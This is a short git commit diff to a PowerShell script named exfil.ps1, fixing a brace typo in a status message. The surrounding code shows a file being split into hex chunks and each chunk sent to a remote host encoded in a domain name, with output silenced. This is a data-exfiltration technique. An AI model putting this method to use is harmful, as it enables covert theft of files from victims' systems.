a45ea65941d2e3bc04550bb47bb3e349bdd49a65
REDD <ar1k88gamingllc@gmail.com>
2023-12-09 18:47:48 -0600

    Update exfil.ps1

--- Client/exfil.ps1
+++ Client/exfil.ps1
@@ -102,7 +102,7 @@ function exfil {
     $segments = Convert-FileToHexChunks -FilePath $filepath
     foreach ($segment in $segments.PSObject.Properties) {
         $secret = $segment.Value;
-	Write-Host "Sending Headers to ${url} using ${regex}.${secret}.${domain).."
+	Write-Host "Sending Headers to ${url} using ${regex}.${secret}.${domain}.."
         send-customRequest -Url "$url" -Domain "$regex.$secret.$domain"  >$null 2>&1
 		sleep 1		
     }
